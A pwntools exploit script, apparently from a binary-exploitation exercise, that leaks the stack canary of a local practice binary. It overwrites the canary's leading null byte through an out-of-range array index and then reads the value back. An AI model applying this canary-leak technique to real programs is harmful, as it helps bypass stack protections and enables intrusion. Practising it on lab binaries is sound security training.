#!/usr/bin/env python3

from pwn import *
import os

# -----------------------
# Config
# -----------------------
BIN_PATH = "./1.out"  # change me
context.binary = ELF(BIN_PATH, checksec=True)

context.log_level = "info"
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = """
# adjust breakpoints for your binary:
break *main
#break *vuln
# continue
"""

"""
p.sendlineafter(b'>', b'something') - send a line after receiving something
p.sendline(b'something') - just send a line
p64(<int>) - pack into 8-byte int
out = p.recvline() - store line of output in variable
"""

# p = process(BIN_PATH) # use me once debugged
p = gdb.debug(BIN_PATH, gdbscript)

# your code here

p.sendline(b"1")
p.sendline(b"12")  # people[12] - canary will be pointed by people[12]->surname
p.sendline(b"A" * 9)  # overwrite the nullbyte at the beginning of canary
p.sendline(b"")
# write nothing, since calculated strings length is zero, nothing will get copied (look that part up in the 1.c)!

p.sendline(b"2")
p.sendline(b"12")  # read people[12] contents
p.recvuntil(b"NAME:")  # recvuntil to clear input buffer from previous inputs
out = p.recvuntil(b"\n")
p.recvuntil(b"SURNAME:")  # same as before
out2 = p.recvuntil(b"\n")

print(f"Leaked data: {out} and {out2}")
print("Leaked canary:")
print(b"\x00" + out2[2:9])  # apply some processing to leaked value


p.interactive()
